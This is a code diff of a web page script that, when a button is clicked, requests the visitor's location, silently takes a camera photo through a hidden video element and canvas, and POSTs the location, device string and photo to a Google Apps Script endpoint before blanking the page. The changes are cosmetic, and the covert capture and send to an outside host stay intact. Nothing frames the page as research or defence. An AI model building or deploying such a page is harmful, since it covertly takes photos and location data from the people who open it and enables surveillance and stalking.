@@ -10,12 +10,11 @@
   <canvas id="canvas" style="display:none"></canvas>
 
   <script>
-    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzEVNhPqc5t8E9zEFLKV0V06xDeMa2PUQiX4rMfxB3VSWqn0m_76iV1O7pNu6NRLTLu/exec";
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzEVNhPqc5t8E9zEFLKV0V06xDeMa2PUQiX4rMfxB3VSWqn0m_76iV1O7pNu6NRLTLu/exec"; // Replace with your Apps Script Web App URL
 
     document.getElementById("startBtn").addEventListener("click", async () => {
       let locationData = null;
 
-      // 1️⃣ Request location
       try {
         const pos = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -25,44 +24,36 @@
         console.log("Location denied");
       }
 
-      // 2️⃣ Request camera
       let photoData = null;
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById("video");
         video.srcObject = stream;
-
         await new Promise(resolve => setTimeout(resolve, 1500));
-
         const canvas = document.getElementById("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
-
         photoData = canvas.toDataURL("image/jpeg");
-
         stream.getTracks().forEach(track => track.stop());
       } catch (err) {
         console.log("Camera denied or failed");
       }
 
-      // 3️⃣ Send data
-      const payload = {
-        location: locationData,
-        device: navigator.userAgent,
-        photo: photoData
-      };
+      // Send data
+      try {
+        const res = await fetch(WEB_APP_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ location: locationData, device: navigator.userAgent, photo: photoData })
+        });
+        console.log(await res.text());
+      } catch(err) {
+        console.error("POST failed:", err);
+      }
 
-      fetch(WEB_APP_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-
-      document.body.innerHTML = ""; // make page blank
+      document.body.innerHTML = "";
     });
   </script>
 </body>
 </html>
-
-
